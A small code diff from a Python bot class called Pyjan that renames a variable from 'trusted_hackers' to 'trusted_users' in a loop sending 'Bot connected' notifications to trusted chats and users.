@@ -28,7 +28,7 @@ class Pyjan:
 		print("[*] Bot connected.")
 		for chat in trusted_chats:
 			bot.sendMessage(chat, "[*] Bot connected.")
-		for user in trusted_hackers:
+		for user in trusted_users:
 			bot.sendMessage(user, "[*] Bot connected.")
 
 		while True:
